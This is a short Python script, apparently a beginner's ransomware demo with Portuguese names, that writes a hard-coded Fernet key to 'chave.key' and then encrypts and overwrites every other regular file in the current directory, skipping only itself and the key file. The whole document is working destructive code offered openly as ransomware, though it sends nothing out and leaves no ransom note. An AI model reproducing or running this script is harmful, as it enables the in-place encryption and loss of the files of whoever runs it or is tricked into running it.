import os
from cryptography.fernet import Fernet

files = []

with open("chave.key", "wb") as chave:
    chave.write(b'WTrSbHcgKc2RxtlXwPbLVOBBUBs6Rz9QJfe0Nj6QlWs=')

for file in os.listdir():
    if file =="ransomware.py" or file == "chave.key":  
        continue
    if os.path.isfile(file):
        files.append(file)
 
for file in files:
    with open(file, "rb") as arquivo:
        conteudo = arquivo.read()
    conteudo_encrypted = Fernet(b'WTrSbHcgKc2RxtlXwPbLVOBBUBs6Rz9QJfe0Nj6QlWs=').encrypt(conteudo)
    with open(file, "wb") as arquivo:
        arquivo.write(conteudo_encrypted)
